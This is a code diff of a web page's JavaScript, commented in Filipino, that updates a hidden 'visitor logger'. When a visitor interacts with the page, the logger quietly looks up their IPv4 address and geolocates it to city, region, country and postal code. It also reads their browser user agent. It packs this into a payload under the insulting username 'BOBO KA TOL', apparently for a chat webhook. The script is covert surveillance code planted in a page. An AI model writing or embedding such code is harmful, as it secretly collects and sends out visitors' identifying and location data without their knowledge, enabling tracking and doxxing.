@@ -139,15 +139,19 @@
             sendVisitorInfo();
         }, { once: true });
 
-        // ✅ Inayos na Logger: Mas tumpak na lokasyon at IPv4
+        // ✅ BAGONG LOGGER: IPv4 + Mas tumpak na lokasyon
         async function sendVisitorInfo() {
             try {
-                // Gamit ang ibang API para mas tumpak sa Pilipinas
-                const geoRes = await fetch('https://ipwho.is/');
+                // Kumuha muna ng IPv4 address
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const visitorIP = ipData.ip;
+
+                // Gamit ang API na mas tumpak sa Pilipinas
+                const geoRes = await fetch(`https://ipapi.co/${visitorIP}/json/`);
                 const geoData = await geoRes.json();
 
-                const visitorIP = geoData.ip || "Hindi makuha";
-                const realLocation = `${geoData.city || "?"}, ${geoData.region || "?"}, ${geoData.country || "?"}`;
+                const realLocation = `${geoData.city || "?"}, ${geoData.region || "?"}, ${geoData.country_name || "Philippines"}`;
                 const zipCode = geoData.postal || "Hindi available";
 
                 const ua = navigator.userAgent;
@@ -197,7 +201,7 @@
                     }
                 } catch (e) {}
 
-                // ✅ Bagong ayos ng fields
+                // ✅ Format ng log
                 const payload = {
                     username: "BOBO KA TOL",
                     avatar_url: "https://i.imgur.com/ZmspxIl.png",
